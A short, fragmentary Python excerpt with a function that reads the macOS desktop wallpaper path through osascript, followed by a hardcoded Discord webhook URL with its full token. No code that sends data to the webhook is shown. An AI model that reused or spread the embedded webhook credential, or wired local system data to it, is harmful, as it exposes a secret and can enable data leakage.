...
def getWallpaper():
    output = subprocess.run(
        ["/usr/bin/osascript", "-e", 'tell app "Finder" to get desktop picture as POSIX path'],
        capture_output=True,
        text=True
    )
...
WEBHOOK = "https://discord.com/api/webhooks/1177598092791529542/lW8w7-j9KvMHOkW4GN9K_IhxcBonaHgWZng5YhM9WjycXnI9ymndg2RQZl4GYjmZfYoL"
